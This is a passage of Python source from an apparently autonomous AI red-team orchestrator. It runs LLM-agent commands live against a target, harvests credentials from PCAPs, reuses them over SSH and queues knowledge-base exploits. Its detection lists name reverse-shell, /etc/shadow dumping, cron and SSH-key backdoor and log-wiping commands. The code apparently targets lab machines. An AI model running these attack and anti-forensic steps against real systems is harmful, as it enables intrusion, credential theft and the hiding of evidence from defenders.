            if _cmd_base:
                step_used_commands.add(_cmd_base)
            
            # Track this command as used for deduplication
            step_used_commands.add(decision.template_name)
            step_used_commands.add(decision.command[:50])  # Also track command prefix
            
            # Track action for stuck detection
            self._record_action(agent_name, decision.command)
            
            # CRITICAL: Add command to attack_context.command_history IMMEDIATELY
            # This enables the anti-repeat guard in SmartCoach to work properly
            if ctx and decision.command:
                ctx.command_history.append(decision.command)
                # Keep history bounded
                if len(ctx.command_history) > 100:
                    ctx.command_history = ctx.command_history[-100:]
            
            # Create result
            result = SmartStepResult(
                agent_name=agent_name,
                decision=decision,
            )
            agent_results.append(result)
            
            # Collect executable actions
            if agent_name == "RedAgent":
                red_action = decision.command
            elif agent_name == "BlueAgent":
                blue_action = decision.command
        
        # Execute environment step
        env_result, new_state, done = self._execute_env_step(red_action, blue_action)
        env_reward = env_result.get("reward", 0.0) if isinstance(env_result, dict) else env_result
        
        # Get output from environment (may be empty in simulation mode)
        env_output = env_result.get("output", "") if isinstance(env_result, dict) else ""
        
        # =====================================================================
        # PHASE 6.1: HARD SIM/LIVE SEPARATION
        # In LIVE mode: execute EVERY agent's command via LiveCommandExecutor
        #               against the real target. No simulated output ever.
        # In SIM mode:  use _generate_simulated_output() as before.
        # These paths NEVER mix.
        # =====================================================================
        if self._is_live_mode and self.live_executor:
            # ── LIVE MODE: Real command execution per agent ──────────
            _live_target = self.config.default_target or ""
            for result in agent_results:
                # ── Phase 39: Resolve target placeholders ────────────
                # MicroChain / LLM-generated commands may contain
                # $TARGET, {target}, {target_range}, {ip}, TARGET etc.
                # Replace them with the actual target IP before execution.
                _exec_cmd = result.decision.command or ""
                if _live_target:
                    import re as _re_sub
                    _exec_cmd = _exec_cmd.replace("$TARGET", _live_target)
                    _exec_cmd = _exec_cmd.replace("{target}", _live_target)
                    _exec_cmd = _exec_cmd.replace("{target_range}", _live_target)
                    _exec_cmd = _exec_cmd.replace("{ip}", _live_target)
                    _exec_cmd = _exec_cmd.replace("{target_ip}", _live_target)
                    _exec_cmd = _exec_cmd.replace("{host}", _live_target)
                    _exec_cmd = _exec_cmd.replace("{rhost}", _live_target)
                    # Also replace 10.10.10.10 placeholder with actual target
                    _exec_cmd = _exec_cmd.replace("10.10.10.10", _live_target)
                    # Replace bare "TARGET" (word boundary) but not inside paths
                    _exec_cmd = _re_sub.sub(
                        r'\bTARGET\b', _live_target, _exec_cmd
                    )
                    result.decision.command = _exec_cmd

                live_result = self.live_executor.execute(
                    _exec_cmd,
                    result.agent_name,
                )
                result.decision.command_output = live_result.output
                # Store structured output channels on the result
                result.live_result = live_result

                # ── HTB: PCAP extraction on downloaded files ─────────
                # If the command downloaded files (wget/curl -o) and the
                # pcap_extractor is available, run it on any downloaded files
                # and append credential info to the command output so the
                # discovery parser picks it up.
                if self.pcap_extractor is not None:
                    import glob as _glob
                    import re as _re
                    _cmd = result.decision.command or ""
                    # Extract output file paths from wget -O or curl -o patterns
                    _dl_paths = _re.findall(
                        r'-[oO]\s+(/tmp/\S+)', _cmd
                    )
                    # Also check for /tmp/dl_* pattern from web_followup downloads
                    if '/tmp/dl_' in _cmd:
                        _dl_paths.extend(_glob.glob('/tmp/dl_*'))
                    # Also check for /tmp/capture*.pcap or /tmp/*.pcap
                    if '/tmp/capture' in _cmd or '.pcap' in _cmd:
                        _dl_paths.extend(_glob.glob('/tmp/capture*.pcap'))
                        _dl_paths.extend(_glob.glob('/tmp/*.pcap'))
                    # Deduplicate
                    _dl_paths = list(set(_dl_paths))
                    for _dl_path in _dl_paths:
                        import os as _os
                        if _os.path.isfile(_dl_path) and _os.path.getsize(_dl_path) > 100:
                            try:
                                pcap_creds = self.pcap_extractor.extract_credentials(_dl_path)
                                if pcap_creds:
                                    # Append extracted creds to command output
                                    # so the discovery parser detects them
                                    _cred_lines = []
                                    for _pc in pcap_creds:
                                        _cred_lines.append(
                                            f"USER {_pc.username}\n"
                                            f"PASS {_pc.password}"
                                        )
                                    _cred_text = (
                                        "\n[PCAP-EXTRACT] Credentials found:\n"
                                        + "\n".join(_cred_lines)
                                    )
                                    result.decision.command_output += _cred_text
                                    logger.warning(
                                        f"[PCAP-EXTRACT] Found {len(pcap_creds)} creds "
                                        f"in {_dl_path}: "
                                        + ", ".join(
                                            f"{c.username}:{c.password[:4]}***"
                                            for c in pcap_creds
                                        )
                                    )
                            except Exception as _e:
                                logger.debug(f"[PCAP-EXTRACT] Error on {_dl_path}: {_e}")
        else:
            # ── SIM MODE: Generate simulated output per agent ───────
            for result in agent_results:
                sim_output = self._generate_simulated_output(result.decision.command)
                result.decision.command_output = sim_output
        
        # Parse outputs for discoveries
        smart_reward_total = 0.0
        
        for result in agent_results:
            # PHASE 6.1: Always parse the command_output (which is either
            # real output from LiveCommandExecutor or simulated output,
            # depending on mode — never both).
            output_to_parse = result.decision.command_output or ""
            
            # Parse discoveries from this agent's output
            agent_discoveries = self._parse_output_for_discoveries(
                output_to_parse, command=result.decision.command or "",
                episode_id=self._current_episode_id,
                step_idx=step, agent_id=result.agent_name,
            )
            
            # ─────────────────────────────────────────────────────────────
            # PHASE 15.0: SENSORY BUFFER — push parsed observation
            # Pushes a bounded entry into per-agent SensoryBuffer on the
            # agent's SmartCoach. Feature-flag gated: FF_SENSORY_BUFFER.
            # ─────────────────────────────────────────────────────────────
            if result.agent_name in self.coaches:
                _coach = self.coaches[result.agent_name]
                if getattr(_coach, '_p15_sensory_buffer', None) is not None:
                    try:
                        from core.neuro.sensory_buffer import SensoryBufferEntry
                        import time as _time
                        _disc_list = []
                        if agent_discoveries:
                            for _dk, _dv in agent_discoveries.items():
                                if isinstance(_dv, (list, set)):
                                    _disc_list.extend(str(x) for x in list(_dv)[:5])
                        _phase_name = (
                            self.attack_context.current_phase.name
                            if self.attack_context else "RECON"
                        )
                        _entry = SensoryBufferEntry(
                            timestamp=_time.time(),
                            command=(result.decision.command or "")[:120],
                            output_signature=(output_to_parse or "")[:200],
                            discoveries=_disc_list[:10],
                            confidence=result.decision.confidence,
                            phase=_phase_name,
                        )
                        _coach._p15_sensory_buffer.push(_entry)  # type: ignore[union-attr]
                    except Exception as e:
                        import logging as _lg
                        _lg.getLogger("ariaska.orchestration").debug(
                            f"[P15] Sensory push failed: {e}"
                        )
            
            # ─────────────────────────────────────────────────────────────
            # PHASE 7.2: VENICE REASONING — DISABLED (Phase 22: GPT-only)
            # Venice added 5-7s latency per call (6000ms ping).
            # All output analysis now handled by GPT-5.2-codex through
            # ParserBroker → LLMOutputInterpreter pipeline.
            # ─────────────────────────────────────────────────────────────
            # Venice reasoning layer commented out — see Phase 22 notes
            pass  # GPT-5.2-codex handles all output interpretation via parser_broker
            
            # ─────────────────────────────────────────────────────────────
            # PHASE 6.5: COMMAND-BASED SHELL DETECTION
            # Known shell-granting commands on MS2 — if the command ran
            # and output does NOT indicate failure, assume shell obtained.
            # This catches cases where regex fails on real terminal output.
            # ─────────────────────────────────────────────────────────────
            cmd_name = getattr(result.decision, 'template_name', '') or ''
            cmd_text = (result.decision.command or '').lower()
            output_lower_check = output_to_parse.lower()
            FAILURE_INDICATORS = ("refused", "timed out", "timeout", "no route", "not found",
                                  "command not found", "connection closed", "error", "denied",
                                  "invalid", "failed", "unsuccessful", "no such", "cannot",
                                  "permission denied", "authentication fail",
                                  "traceback", "modulenotfounderror", "importerror",
                                  "nameerror", "syntaxerror", "no module named")
            has_failure = any(f in output_lower_check for f in FAILURE_INDICATORS)
            has_output = len(output_to_parse.strip()) > 10  # non-trivial output
            
            SHELL_GRANTING_COMMANDS = {
                "telnet_1524", "rsh_root", "rlogin_root", "vsftpd_exploit",
                "unrealircd_exploit", "samba_exploit", "java_rmi_exploit",
                "tomcat_war_deploy", "war_deploy", "distcc_exploit",
                "psql_rce", "ssh_login", "telnet_login",
                "nc_reverse_shell", "nc_bind_shell",
            }
            # NOTE: Don't use cmd_text prefix matching — anti-repeat can
            # replace the actual command while keeping the original template_name,
            # causing false positives (e.g. nc -zv port scan replacing cme_smb_shares).
            # Only use template_name matching which is reliable.
            
            cmd_is_shell_granting = cmd_name in SHELL_GRANTING_COMMANDS
            # Phase 8.2 Batch 13: Also detect shell from command text when anti-repeat
            # replaces a command but keeps the original template_name
            if not cmd_is_shell_granting and cmd_text:
                _shell_cmd_indicators = ("sshpass ", "ssh ", "telnet ", "rlogin ", "rsh ", "nc -e ")
                if any(cmd_text.startswith(ind) for ind in _shell_cmd_indicators):
                    cmd_is_shell_granting = True
            
            # R47 Fix #1: Override has_failure when POSITIVE shell indicators appear
            # alongside "connection closed". SSH on MS2 (OpenSSH 4.7p1) often returns
            # uid=0(root) or shadow hashes, then immediately closes the connection.
            # Without this override, has_failure=True blocks all shell detection.
            if has_failure and has_output and cmd_is_shell_granting:
                _POSITIVE_SHELL_OVERRIDES = (
                    "uid=0(root)", "uid=0", "root:$", "root:!",
                    "msfadmin:$", "$1$", "$6$", "$5$",  # shadow hash formats
                    "# ", "root@",  # root prompt indicators
                )
                if any(pos in output_to_parse for pos in _POSITIVE_SHELL_OVERRIDES):
                    has_failure = False
                    logger.info(
                        f"[SHELL-DETECT] R47: Positive shell override — "
                        f"output contains root indicators despite connection close "
                        f"(cmd='{cmd_name}', agent={result.agent_name})"
                    )
            
            if cmd_is_shell_granting and has_output and not has_failure:
                if not agent_discoveries.get("shell"):
                    agent_discoveries["shell"] = True
                    logger.info(f"[SHELL-DETECT] Command-based shell detection for '{cmd_name}' by {result.agent_name}")
                # Root shell for known root-granting commands
                ROOT_SHELL_COMMANDS = {
                    "telnet_1524", "rsh_root", "rlogin_root", "vsftpd_exploit",
                    "unrealircd_exploit", "samba_exploit",
                    # Phase 8.2 Batch 13: SSH with default creds on MS2/MS3 → sudo root
                    "ssh_login", "telnet_login",
                }
                if cmd_name in ROOT_SHELL_COMMANDS or "1524" in cmd_text:
                    if not agent_discoveries.get("root_shell"):
                        agent_discoveries["root_shell"] = True
                        logger.info(f"[SHELL-DETECT] Command-based ROOT shell detection for '{cmd_name}'")
                # Phase 8.2 Batch 13: Also detect root from output — covers anti-repeat
                # sshpass variants where template_name doesn't match
                if not agent_discoveries.get("root_shell") and output_to_parse:
                    if re.search(r"uid=0\(root\)", output_to_parse):
                        agent_discoveries["root_shell"] = True
                        logger.info(f"[SHELL-DETECT] Output-based ROOT shell detection (uid=0) for '{cmd_name}' by {result.agent_name}")
            
            # ─── COMMAND-BASED PERSISTENCE DETECTION ─────────────────────
            # Phase 8.2: Expanded persistence command set
            PERSISTENCE_COMMANDS = {
                "cron_backdoor", "ssh_key_persistence", "ssh_key_plant",
                "plant_ssh_key", "add_backdoor_user", "clear_bash_history",
                "clear_auth_logs", "clear_syslog", "remove_uploaded_tools",
                "remove_ssh_keys_planted",
                # Phase 8.2: Additional persistence indicators
                "check_crontab", "check_ssh_keys",
            }
            # Phase 8.2: Also detect persistence from command text patterns
            PERSISTENCE_PATTERNS = (
                "crontab", "authorized_keys", ".ssh/", "useradd", "adduser",
                "echo '* * * * *",
            )
            cmd_is_persist = (
                cmd_name in PERSISTENCE_COMMANDS
                or any(p in cmd_text for p in PERSISTENCE_PATTERNS)
            )
            if cmd_is_persist and has_output and not has_failure:
                if not agent_discoveries.get("persistence"):
                    agent_discoveries["persistence"] = True
                    logger.info(f"[PERSIST-DETECT] Command-based persistence detection for '{cmd_name}'")
            
            # ─── COMMAND-BASED EXFILTRATION DETECTION ────────────────────
            # Phase 8.2 Batch 9: Also match by template_name AND detect exfil
            # inside telnet-wrapped { echo ... } blocks where cmd_text starts with {
            EXFIL_COMMANDS = {
                "nc_exfil", "curl_exfil", "scp_exfil", "base64_exfil",
                "exfil_shadow", "exfil_ssh_keys", "exfil_mysql_dump",
                "dump_shadow", "dump_passwd",
                # Phase 8.2: Additional exfil template names
                "cat_shadow", "cat_passwd", "mysql_dump",
                "dump_hashes", "find_sensitive_files",
            }
            EXFIL_PREFIXES = (
                "cat /etc/shadow", "cat /etc/passwd", "mysqldump",
                "pg_dump", "base64 /etc/", "find / -name",
            )
            # Phase 8.2: Also check inside { echo '...' } wrapped commands
            _inner_cmd = cmd_text
            if cmd_text.startswith("{") and "echo" in cmd_text:
                # Extract what's inside echo quotes: { echo 'cat /etc/passwd'; ... }
                import re as _re
                _echo_match = _re.search(r"echo\s+['\"]([^'\"]+)['\"]", cmd_text)
                if _echo_match:
                    _inner_cmd = _echo_match.group(1).strip()
            cmd_is_exfil = (
                cmd_name in EXFIL_COMMANDS
                or any(cmd_text.startswith(p) for p in EXFIL_PREFIXES)
                or any(_inner_cmd.startswith(p) for p in EXFIL_PREFIXES)
            )
            # Phase 8.2 Batch 9: For known exfil template names, don't gate on has_failure
            # (output may contain minor errors alongside real sensitive data)
            # Phase 8.2 Batch 16: BUT if has_failure AND output lacks actual sensitive
            # data, reject — prevents false positive on MS3 where port 1524 is closed
            # and dump_passwd/dump_shadow templates always get "Connection refused".
            _exfil_by_name = cmd_name in EXFIL_COMMANDS
            _SENSITIVE_DATA_MARKERS = ("root:x:0:0:", "root:$", ":0:0:root",
                                       "msfadmin:$", "$6$", "$1$", "$5$",
                                       "BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY",
                                       "CREATE TABLE", "INSERT INTO", "mysqldump")
            _has_sensitive_data = any(m in output_to_parse for m in _SENSITIVE_DATA_MARKERS)
            # Allow exfil if: (a) no failure, OR (b) by-name AND has sensitive data
            _exfil_pass = (not has_failure) or (_exfil_by_name and _has_sensitive_data)
            if cmd_is_exfil and has_output and _exfil_pass:
                # Phase 8.0: Only mark exfil after post-shell exploration minimum
                _steps_since_shell = (step - self._shell_obtained_step) if self._shell_obtained_step is not None else 0
                _min_explore = 2 if (self._shell_obtained_step is not None and self._shell_obtained_step >= 28) else self.POST_SHELL_EXPLORE_STEPS
                if _steps_since_shell >= _min_explore:
                    if not agent_discoveries.get("data_exfiltrated"):
                        agent_discoveries["data_exfiltrated"] = True
                        logger.info(f"[EXFIL-DETECT] Command-based exfiltration detection for '{cmd_name}'")
            
            # ─── Phase 8.2 Batch 9: OUTPUT-BASED EXFIL DETECTION ────────
            # If the OUTPUT contains sensitive data (password hashes, /etc/passwd
            # entries, database dumps), that IS exfiltration regardless of command
            if has_output and not agent_discoveries.get("data_exfiltrated"):
                _EXFIL_OUTPUT_INDICATORS = (
                    "root:x:0:0:", "root:$", ":0:0:root",  # /etc/passwd or /etc/shadow
                    "mysql>", "MariaDB", "PostgreSQL",  # DB access
                    "msfadmin:$", "$6$", "$1$", "$5$",  # password hashes
                    "BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY",  # SSH keys
                    "CREATE TABLE", "INSERT INTO", "mysqldump",  # DB dumps
                )
                if any(ind in output_to_parse for ind in _EXFIL_OUTPUT_INDICATORS):
                    _steps_since_shell = (step - self._shell_obtained_step) if self._shell_obtained_step is not None else 0
                    _min_explore = 2 if (self._shell_obtained_step is not None and self._shell_obtained_step >= 28) else self.POST_SHELL_EXPLORE_STEPS
                    if _steps_since_shell >= _min_explore:
                        agent_discoveries["data_exfiltrated"] = True
                        logger.info(f"[EXFIL-DETECT] Output-based exfiltration: sensitive data in output of '{cmd_name}'")
            
            # ─── COMMAND-BASED CLOSEOUT DETECTION ────────────────────────
            CLOSEOUT_COMMANDS = {
                "remove_uploaded_tools", "remove_ssh_keys_planted",
                "remove_cron_backdoors", "verify_target_stable",
                "cleanup_tmp_artifacts", "generate_report",
                # Anti-forensics (Phase 6.7)
                "clear_bash_history", "clear_auth_logs", "clear_wtmp_btmp",
                "shred_sensitive_files", "timestomp_closeout", "clear_syslog",
                "remove_known_hosts",
            }
            if cmd_name in CLOSEOUT_COMMANDS and has_output and not has_failure:
                if not agent_discoveries.get("artifacts_removed"):
                    agent_discoveries["artifacts_removed"] = True
                    logger.info(f"[CLOSEOUT-DETECT] Command-based closeout detection for '{cmd_name}'")
            
            # =====================================================================
            # PHASE 2A: DISCOVERY → STATE FLAG BRIDGE
            # Map parsed discoveries to AttackContext state_flags so phase can
            # advance through RECON → ENUMERATION → EXPLOITATION → PRIVESC → POST
            # =====================================================================
            if agent_discoveries and self.attack_context:
                ctx = self.attack_context
                
                # Service discoveries → set_state_flag (triggers phase auto-advance)
                for svc in agent_discoveries.get("service", []):
                    ctx.add_service(svc)  # add_service already calls set_state_flag
                
                # Port discoveries → add to context + set flags
                for port in agent_discoveries.get("open_port", []):
                    ctx.add_discovery("open_port", port)
                    # Set ports_discovered flag
                    if not ctx.state_flags.get("ports_discovered"):
                        ctx.set_state_flag("ports_discovered")
                        logger.info(f"[PHASE-ADVANCE] ports_discovered set by {result.agent_name}")
                    # Port-based service inference (backup for service name detection)
                    _port_int = int(port) if isinstance(port, (int, str)) and str(port).isdigit() else 0
                    if _port_int in (80, 8080, 8000, 8443, 8888):
                        if not ctx.state_flags.get("http_service_found"):
                            ctx.set_state_flag("http_service_found")
                            logger.info(f"[PHASE-ADVANCE] http_service_found set via port {_port_int}")
                    elif _port_int == 443:
                        if not ctx.state_flags.get("http_service_found"):
                            ctx.set_state_flag("http_service_found")
                            logger.info(f"[PHASE-ADVANCE] http_service_found set via port 443")
                    elif _port_int == 21:
                        if not ctx.state_flags.get("ftp_service_found"):
                            ctx.set_state_flag("ftp_service_found")
                    elif _port_int == 22:
                        if not ctx.state_flags.get("ssh_service_found"):
                            ctx.set_state_flag("ssh_service_found")
                    elif _port_int in (139, 445):
                        if not ctx.state_flags.get("smb_service_found"):
                            ctx.set_state_flag("smb_service_found")
                    elif _port_int == 3306:
                        if not ctx.state_flags.get("mysql_service_found"):
                            ctx.set_state_flag("mysql_service_found")
                
                # Credential discovery → advance to EXPLOITATION
                if "credential" in agent_discoveries:
                    ctx.set_state_flag("credentials_known")
                    logger.info(f"[PHASE-ADVANCE] credentials_known set by {result.agent_name}")

                    # Phase 40: Register credentials with SSH pool
                    if self._ssh_pool is not None and ctx.target:
                        try:
                            _cred_list = ctx.state_flags.get("credentials_list", [])
                            for _cr in _cred_list[-3:]:  # Last 3 creds
                                if isinstance(_cr, dict) and _cr.get("username") and _cr.get("password"):
                                    self._ssh_pool.add_credentials(
                                        _cr["username"], _cr["password"],
                                        ctx.target, port=int(_cr.get("port", 22))
                                    )
                        except Exception:
                            pass
                
                # Vulnerability/SQLi discovery → advance to EXPLOITATION
                if agent_discoveries.get("vulnerability"):
                    ctx.set_state_flag("vulnerability_found")
                    cves = agent_discoveries.get("cve", [])
                    if cves:
                        ctx.add_discovery("cve", cves)
                    # Check for specific vuln types that advance phase further
                    output_lower = (output_to_parse or "").lower()
                    if "sql injection" in output_lower or "sqli" in output_lower:
                        ctx.set_state_flag("sqli_confirmed")
                        logger.info(f"[PHASE-ADVANCE] sqli_confirmed set by {result.agent_name}")
                
                # Shell discovery → advance to PRIVILEGE_ESCALATION
                if agent_discoveries.get("shell"):
                    if not ctx.state_flags.get("shell_obtained"):
                        logger.info(f"[PHASE-ADVANCE] shell_obtained set by {result.agent_name}")
                        # Phase 8.0: Track when shell was first obtained for post-shell exploration
                        if self._shell_obtained_step is None:
                            self._shell_obtained_step = step
                    ctx.set_state_flag("shell_obtained")
                    if agent_discoveries.get("root_shell"):
                        if not ctx.state_flags.get("root_shell_obtained"):
                            logger.info(f"[PHASE-ADVANCE] root_shell_obtained set by {result.agent_name}")
                        ctx.set_state_flag("root_shell_obtained")
                        ctx.set_state_flag("admin_access_obtained")
                
                # User discoveries
                for user in agent_discoveries.get("user", []):
                    ctx.add_discovery("user", user)
                
                # SMB shares
                for share in agent_discoveries.get("smb_share", []):
                    ctx.add_discovery("smb_share", share)
                    ctx.set_state_flag("smb_service_found")
                
                # Web paths → mark services as enumerated + web_paths_discovered
                if agent_discoveries.get("web_path"):
                    ctx.set_state_flag("services_enumerated")
                    ctx.set_state_flag("web_paths_discovered")
                    for path in agent_discoveries["web_path"]:
                        ctx.add_discovery("web_path", path)
                
                # Database discovery
                if agent_discoveries.get("database"):
                    ctx.set_state_flag("database_found")
                    for db in agent_discoveries.get("db_name", []):
                        ctx.add_discovery("database", db)
                
                # Sensitive file discovery
                if agent_discoveries.get("sensitive_file"):
                    ctx.add_discovery("sensitive_file", True)
                    ctx.set_state_flag("services_enumerated")
                
                # Hash discovery → lateral movement
                # R56: Minimum PRIV_ESC duration gate — defer hash_known
                # until agent has spent MIN_PRIVESC_STEPS in PRIV_ESC.
                # This prevents organic hash discovery (cat /etc/shadow)
                # from rushing episodes to LATERAL in ~11 steps.
                # Gate applies to ALL phases before LATERAL — not just PRIV_ESC.
                # If hash is discovered during EXPLOITATION (before shell),
                # it's deferred until PRIV_ESC + MIN steps, preventing the
                # phase graph from skipping PRIV_ESC entirely.
                # Cascade at 12 steps bypasses this gate (sets flag directly).
                if agent_discoveries.get("hash_dump"):
                    _current_phase = self.attack_context.current_phase.name
                    _past_privesc = _current_phase in (
                        "LATERAL_MOVEMENT", "POST_EXPLOITATION",
                        "EXFILTRATION", "CLOSEOUT",
                    )
                    if _past_privesc:
                        # Already past PRIV_ESC — set immediately
                        ctx.set_state_flag("hash_known")
                        logger.info(f"[PHASE-ADVANCE] hash_known set by {result.agent_name}")
                    elif _current_phase == "PRIVILEGE_ESCALATION":
                        # In PRIV_ESC — check minimum step requirement
                        _privesc_start = self._phase_start_step.get("PRIVILEGE_ESCALATION", step)
                        _privesc_steps_here = step - _privesc_start
                        if _privesc_steps_here >= self.MIN_PRIVESC_STEPS:
                            ctx.set_state_flag("hash_known")
                            logger.info(f"[PHASE-ADVANCE] hash_known set by {result.agent_name}")
                        else:
                            if not self._deferred_hash_known:
                                self._deferred_hash_known = True
                                logger.info(
                                    f"[R56-GATE] hash_dump by {result.agent_name} deferred — "
                                    f"PRIV_ESC step {_privesc_steps_here}/{self.MIN_PRIVESC_STEPS}"
                                )
                    else:
                        # In RECON/ENUM/EXPLOITATION — defer until PRIV_ESC + MIN steps
                        if not self._deferred_hash_known:
                            self._deferred_hash_known = True
                            logger.info(
                                f"[R56-GATE] hash_dump by {result.agent_name} deferred — "
                                f"currently in {_current_phase}, waiting for PRIV_ESC"
                            )
                
                # Lateral target → lateral movement
                if agent_discoveries.get("lateral_target"):
                    ctx.set_state_flag("lateral_target_found")
                    logger.info(f"[PHASE-ADVANCE] lateral_target_found set by {result.agent_name}")
                
                # Domain admin → post-exploitation
                if agent_discoveries.get("domain_admin"):
                    ctx.set_state_flag("domain_admin_obtained")
                    ctx.set_state_flag("admin_access_obtained")
                    logger.info(f"[PHASE-ADVANCE] domain_admin_obtained set by {result.agent_name}")

                # Persistence → exfiltration (Phase 8.0: post-shell gate)
                if agent_discoveries.get("persistence"):
                    _steps_since_shell = (step - self._shell_obtained_step) if self._shell_obtained_step is not None else 0
                    _min_explore = 2 if (self._shell_obtained_step is not None and self._shell_obtained_step >= 28) else self.POST_SHELL_EXPLORE_STEPS
                    if _steps_since_shell >= _min_explore:
                        if not ctx.state_flags.get("persistence_established"):
                            logger.info(f"[PHASE-ADVANCE] persistence_established set by {result.agent_name}")
                        ctx.set_state_flag("persistence_established")
                    else:
                        logger.debug(f"[POST-SHELL-EXPLORE] Suppressing persistence_established — {_steps_since_shell}/{self.POST_SHELL_EXPLORE_STEPS} post-shell steps")
                        # Phase 8.2 Batch 16: Defer for re-evaluation when gate is satisfied
                        self._deferred_discoveries.append(("persistence", result.agent_name, step))
                
                # Data exfiltration → exfiltration phase (Phase 8.0: post-shell gate)
                if agent_discoveries.get("data_exfiltrated"):
                    _steps_since_shell = (step - self._shell_obtained_step) if self._shell_obtained_step is not None else 0
                    _min_explore = 2 if (self._shell_obtained_step is not None and self._shell_obtained_step >= 28) else self.POST_SHELL_EXPLORE_STEPS
                    if _steps_since_shell >= _min_explore:
                        if not ctx.state_flags.get("data_exfiltrated"):
                            logger.info(f"[PHASE-ADVANCE] data_exfiltrated set by {result.agent_name}")
                        ctx.set_state_flag("data_exfiltrated")
                    else:
                        logger.debug(f"[POST-SHELL-EXPLORE] Suppressing data_exfiltrated — {_steps_since_shell}/{self.POST_SHELL_EXPLORE_STEPS} post-shell steps")
                        # Phase 8.2 Batch 16: Defer for re-evaluation when gate is satisfied
                        self._deferred_discoveries.append(("data_exfiltrated", result.agent_name, step))

                # Closeout artifacts removed → closeout phase completion
                if agent_discoveries.get("artifacts_removed") or agent_discoveries.get("closeout_completed"):
                    if not ctx.state_flags.get("closeout_completed"):
                        logger.info(f"[PHASE-ADVANCE] closeout_completed set by {result.agent_name}")
                    ctx.set_state_flag("artifacts_removed")
                    ctx.set_state_flag("closeout_completed")

                # ─── Phase 11.1 + 24: User/Root flag capture + auto-close ──
                if agent_discoveries.get("user_flag"):
                    ctx.set_state_flag("user_flag_captured")
                    _uf_val = agent_discoveries["user_flag"]
                    if isinstance(_uf_val, list):
                        _uf_val = _uf_val[0] if _uf_val else ""
                    logger.info(f"[FLAG-CAPTURE] user_flag captured by {result.agent_name}: {_uf_val[:40]}")
                    self.discovery_board["flags_set"].add("user_flag_captured")
                    self.discovery_board["user_flag_value"] = str(_uf_val)
                if agent_discoveries.get("root_flag"):
                    ctx.set_state_flag("root_flag_captured")
                    _rf_val = agent_discoveries["root_flag"]
                    if isinstance(_rf_val, list):
                        _rf_val = _rf_val[0] if _rf_val else ""
                    logger.info(f"[FLAG-CAPTURE] root_flag captured by {result.agent_name}: {_rf_val[:40]}")
                    self.discovery_board["flags_set"].add("root_flag_captured")
                    self.discovery_board["root_flag_value"] = str(_rf_val)

                # ─── PHASE 4: Update discovery board for cross-agent sharing ─
                _new_ports_found = False
                for port in agent_discoveries.get("open_port", []):
                    if port not in self.discovery_board["ports"]:
                        _new_ports_found = True
                    self.discovery_board["ports"].add(port)
                
                # Re-trigger credential reuse when new ports are discovered
                # This handles the case where creds were found before ports
                if _new_ports_found and self.cred_reuse_engine is not None:
                    _stored_creds = self.cred_reuse_engine.get_all_credentials()
                    if _stored_creds:
                        _known_ports = {int(p) for p in self.discovery_board.get("ports", set())
                                        if str(p).isdigit()}
                        _reuse_cmds = self.cred_reuse_engine.generate_all_reuse_commands(_known_ports)
                        for rcmd in _reuse_cmds:
                            self.followup_queue.append({
                                "command": rcmd["command"],
                                "source": "cred_reuse",
                                "priority": 100,
                                "description": rcmd.get("description", ""),
                                "service": rcmd.get("service", ""),
                                "ttl": 15,
                            })
                        if _reuse_cmds:
                            logger.debug(
                                f"[CRED-REUSE-RETRIGGER] New ports discovered — "
                                f"queued {len(_reuse_cmds)} reuse commands for "
                                f"{len(_stored_creds)} stored creds"
                            )
                for svc in agent_discoveries.get("service", []):
                    self.discovery_board["services"].add(svc)
                
                # ─── Phase 18: Scout→Red knowledge-driven handoff ────
                # When new ports OR services are discovered, query the
                # knowledge corpus for matching exploit commands and push
                # them into followup_queue so Red picks them up next step.
                _new_svcs = [s for s in agent_discoveries.get("service", [])
                             if s not in self.discovery_board.get("_kb_queried_svcs", set())]
                _new_port_list = [p for p in agent_discoveries.get("open_port", [])
                                  if p not in self.discovery_board.get("_kb_queried_ports", set())]
                if _new_port_list or _new_svcs:
                    try:
                        from data.knowledge_retriever import get_knowledge_retriever
                        _kr = get_knowledge_retriever(lazy=True)
                        if _kr._loaded:
                            _kb_cmds_added = 0
                            # Track what we've already queried to avoid duplicates
                            self.discovery_board.setdefault("_kb_queried_ports", set())
                            self.discovery_board.setdefault("_kb_queried_svcs", set())
                            
                            for _np in _new_port_list:
                                self.discovery_board["_kb_queried_ports"].add(_np)
                                try:
                                    _entries = _kr.by_port(int(_np), max_results=5)
                                    for _entry in _entries:
                                        for _cmd_key in ("exploitation_commands", "enumeration_commands", "commands"):
                                            for _cmd in (_entry.get(_cmd_key, []) or [])[:2]:
                                                if isinstance(_cmd, str) and len(_cmd) > 5:
                                                    _target = (self.attack_context.target if self.attack_context else getattr(self.config, 'default_target', 'TARGET'))
                                                    self.followup_queue.append({
                                                        "command": _cmd.replace("{target}", _target or "TARGET"),
                                                        "source": "kb_handoff",
                                                        "priority": 90,
                                                        "description": f"KB exploit for port {_np}",
                                                        "ttl": 12,
                                                    })
                                                    _kb_cmds_added += 1
                                except (ValueError, TypeError):
                                    pass
                                    
                            for _ns in _new_svcs:
                                self.discovery_board["_kb_queried_svcs"].add(_ns)
                                try:
                                    _svc_key = str(_ns).split("/")[0].strip().lower()
                                    _entries = _kr.by_service(_svc_key, max_results=5)
                                    for _entry in _entries:
                                        for _cmd_key in ("exploitation_commands", "enumeration_commands", "commands"):
                                            for _cmd in (_entry.get(_cmd_key, []) or [])[:2]:
                                                if isinstance(_cmd, str) and len(_cmd) > 5:
                                                    _target = (self.attack_context.target if self.attack_context else getattr(self.config, 'default_target', 'TARGET'))
                                                    self.followup_queue.append({
                                                        "command": _cmd.replace("{target}", _target or "TARGET"),
                                                        "source": "kb_handoff",
                                                        "priority": 85,
                                                        "description": f"KB exploit for {_svc_key}",
                                                        "ttl": 12,
                                                    })
                                                    _kb_cmds_added += 1
                                except (ValueError, TypeError):
                                    pass
                            
                            if _kb_cmds_added > 0:
                                logger.warning(
                                    f"[KB-HANDOFF] Scout→Red: queued {_kb_cmds_added} "
                                    f"knowledge-matched exploit commands for "
                                    f"ports={_new_port_list}, services={_new_svcs}"
                                )
                    except Exception as _kbe:
                        logger.debug(f"[KB-HANDOFF] Knowledge retriever unavailable: {_kbe}")

                for user in agent_discoveries.get("user", []):
                    self.discovery_board["users"].add(user)
                if agent_discoveries.get("credential"):
                    self.discovery_board["credentials"].add("found")
                    # HTB Capability Upgrade: Extract structured creds from parsed output
                    # and feed to LiveCommandExecutor for SSH auto-wrap
                    self._process_credential_discovery(output_to_parse or "", result.decision.command or "")
                if agent_discoveries.get("shell"):
                    self.discovery_board["shells"].add(result.agent_name)
